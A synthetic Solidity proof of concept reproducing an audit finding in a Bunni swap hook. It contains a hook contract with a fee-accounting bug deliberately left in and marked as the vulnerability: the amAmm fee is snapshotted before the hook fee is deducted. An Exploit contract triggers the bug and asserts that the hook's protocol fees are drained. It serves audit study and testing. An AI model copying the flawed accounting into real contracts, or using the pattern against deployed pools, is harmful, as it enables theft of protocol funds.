// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bunni — amAmmFeeAmount keeps the hook fee, then the referrer is paid again
    (Pashov, August 2024). SYNTHETIC, cheatcode-free.
    swap fee is 100e18. Hook fee is 20e18, so amAmm should receive 80e18 and the
    hook should keep 10e18 after a 10e18 referrer reward, plus 10e18 of prior
    protocol fees. amAmm is paid the full 100e18 and the referrer is also paid
    10e18, so the hook ends at 0. (@> VULN) */

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // S5
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BunniHook {
    uint256 public constant SWAP_FEE_BASE = 1e18;
    uint256 public constant MODIFIER_BASE = 1e18;

    MockToken public token;
    address public manager;
    address public referrer;
    uint256 public swapFeeAmount;
    uint256 public hookFeesAmount;
    uint256 public amAmmFeeAmount;

    constructor(MockToken t, address manager_, address referrer_) {
        token = t;
        manager = manager_;
        referrer = referrer_;
    }

    function beforeSwap(uint256 outputAmount, uint256 swapFee, uint256 hookFeeModifier, uint256 referralRewardModifier)
        external
    {
        token.transferFrom(msg.sender, address(this), outputAmount * swapFee / SWAP_FEE_BASE); // S2
        swapFeeAmount = outputAmount * swapFee / SWAP_FEE_BASE;
        amAmmFeeAmount = swapFeeAmount; // @> VULN: S3 snapshot includes the hook fee that is subtracted next
        hookFeesAmount = swapFeeAmount * hookFeeModifier / MODIFIER_BASE;
        swapFeeAmount -= hookFeesAmount; // S4
        token.transfer(manager, amAmmFeeAmount);
        if (hookFeesAmount != 0) {
            uint256 referrerRewardAmount = hookFeesAmount * referralRewardModifier / MODIFIER_BASE;
            token.transfer(referrer, referrerRewardAmount);
        }
    }
}

contract Exploit {
    MockToken public token; // nonce 1
    address public manager; // nonce 2, a bare receiver via this contract's child
    address public referrer; // nonce 3
    BunniHook public hook; // nonce 4

    uint256 public constant PRIOR = 10e18;
    uint256 public managerGot;
    uint256 public hookLeft;
    uint256 public referrerGot;

    constructor() {
        token = new MockToken();
        manager = address(new Receiver());
        referrer = address(new Receiver());
        hook = new BunniHook(token, manager, referrer);
        token.mint(address(hook), PRIOR);
        token.mint(address(this), 100e18);
    }

    function run() external {
        token.approve(address(hook), type(uint256).max);
        hook.beforeSwap(1000e18, 0.1e18, 0.2e18, 0.5e18); // S1
        managerGot = token.balanceOf(manager); // S6
        hookLeft = token.balanceOf(address(hook));
        referrerGot = token.balanceOf(referrer);
        require(managerGot == 100e18, "amAmm fee");
        require(referrerGot == 10e18, "referrer");
        require(hookLeft == 0, "protocol residual survived");
        require(managerGot > 80e18, "amAmm did not take the hook fee");
    }
}

contract Receiver {
    // token receiver only; no ETH
}
